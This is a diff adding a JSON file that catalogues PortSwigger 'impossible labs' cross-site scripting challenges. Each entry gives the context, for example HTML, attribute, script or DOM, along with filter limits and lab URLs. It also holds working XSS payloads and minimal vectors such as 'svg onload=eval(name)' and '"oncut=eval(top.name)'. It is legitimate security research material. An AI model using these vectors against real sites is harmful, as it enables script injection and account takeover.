@@ -1,0 +1,58 @@
+[
+    {
+        "title": "Basic context, WAF blocks <[a-zA-Z]", 
+        "descriptionHTML": "This lab captures the scenario when you can't use an open tag followed by an alphanumeric character. Sometimes you can solve this problem by bypassing the WAF entirely, but what about when that's not an option? Certain versions of .NET have this behaviour, and it's only known to be exploitable in old IE with &lt;%tag.",        
+        "context": "HTML",
+        "url": "https://portswigger-labs.net/impossible-labs/basic-context-waf-blocks-a-z.php?x=%3Cscript%3Ealert(1)%3C/script%3E"        
+    },
+    {
+        "title": "Script based injection but quotes, forward slash and backslash are escaped", 
+        "descriptionHTML": "We often encounter this situation in the wild: you have an injection inside a JavaScript variable and can inject angle brackets, but quotes and forward/backslashes are escaped so you can't simply close the script block.<br><br>The closest we've got to solving this is when you have multiple injection points. <a href=\"http://portswigger-labs.net/xss/script.php?x=%3C!--%3Cscript%3E&y=%3C/script%3E%3Cimg%20src=1%20onerror=alert(1)%3E\">1 within a script based context and one in HTML</a>.",        
+        "context": "Script",
+        "url": "http://portswigger-labs.net/impossible-labs/script-context-escaped-angle-brackets-allowed.php?x=%3C/script%3E%3Cimg%20src=1%20onerror=alert(1)%3E"
+    },
+    {
+        "title": "innerHTML context but no equals allowed", 
+        "descriptionHTML": "You have a site that processes the query string and URL decodes the parameters but splits on the equals then assigns to innerHTML. In this context &lt;script&gt; doesn't work and we can't use = to create an event.",        
+        "context": "DOM",
+        "url": "https://portswigger-labs.net/impossible-labs/innerHTML-no-equals.php?x=%3Cimg%20src=1%20onerror=alert(1)%3E"        
+    },
+    {
+        "title": "Basic context length limit", 
+        "descriptionHTML": "This lab's injection occurs within the basic HTML context but has a length limitation of 18. We came up with a vector that could execute JavaScript in 19 characters: &lt;svg onload=alert`` but can you beat it?",
+        "context": "HTML",
+        "url": "https://portswigger-labs.net/impossible-labs/basic-context-length-limit.php?x=%3Csvg%20onload=alert``",
+        "lengthLimit": 18,
+        "closestVector": "<svg onload=alert``"    
+    },
+    {
+        "title": "Attribute context length limit", 
+        "descriptionHTML": "The context of this lab inside an attribute with a length limitation of 14 characters. We came up with a vector that executes JavaScript in 15 characters:\"oncut=alert``+ the plus is a trailing space. Do you think you can beat it?",
+        "context": "Attribute",
+        "url": "https://portswigger-labs.net/impossible-labs/attribute-context-length-limit.php?x=%22oncut=alert``+",
+        "lengthLimit": 14,
+        "closestVector": "\"oncut=alert`` "  
+    },
+    {
+        "title": "Basic context length limit, arbitrary code", 
+        "descriptionHTML": "It's all well and good executing JavaScript but if all you can do is call alert what use is that? In this lab we demonstrate the shortest possible way to execute arbitrary code.",
+        "context": "HTML",
+        "url": "https://portswigger-labs.net/impossible-labs/basic-context-length-limit-arbitrary.php?x=%3Csvg%20onload=eval(name)",
+        "lengthLimit": 21,    
+        "closestVector": "<svg onload=eval(name)"  
+    },
+    {
+        "title": "Attribute context length limit arbitrary code", 
+        "descriptionHTML": "Again calling alert proves you can call a function but we created another lab to find the shortest possible attribute based injection with arbitrary JavaScript.",
+        "context": "Attribute",
+        "url": "https://portswigger-labs.net/impossible-labs/attribute-context-length-limit-arbitrary.php?x=%22oncut=eval(top.name)+",
+        "lengthLimit": 21,
+        "closestVector": "\"oncut=eval(top.name) "           
+    },
+    {
+        "title": "Injection occurs inside a frameset but before the body", 
+        "descriptionHTML": "We received a <a href=\"https://twitter.com/roughwire/status/1250320540625014787?s=20\">request from twitter</a> about this next lab. It occurs within a frameset but before a body tag with equals filtered. You would think you could inject a closing frameset followed by a script block but that would be too easy.",
+        "context": "HTML",
+        "url": "https://portswigger-labs.net/impossible-labs/after-frameset-before-body.php?x=%3C/frameset%3E%3Cscript%3Ealert(1)%3C/script%3E"    
+    }
+]
